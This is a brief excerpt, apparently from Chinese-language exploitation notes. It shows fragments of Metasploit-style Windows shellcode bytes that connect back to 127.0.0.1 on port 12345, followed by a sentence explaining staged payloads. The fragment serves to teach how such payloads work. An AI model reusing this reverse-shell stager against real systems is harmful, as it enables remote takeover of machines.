...
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x7f\x00\x00\x01\x68\x02"
"\x00\x30\x39\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
...
msf生成的payload叫做staged payload。staged payload 一般使一种尽可能紧凑并且用于为后续攻击创造更好的执行环境（如更大的内存空间，因为二进制攻击往往能够存储shellcode的空间不多）。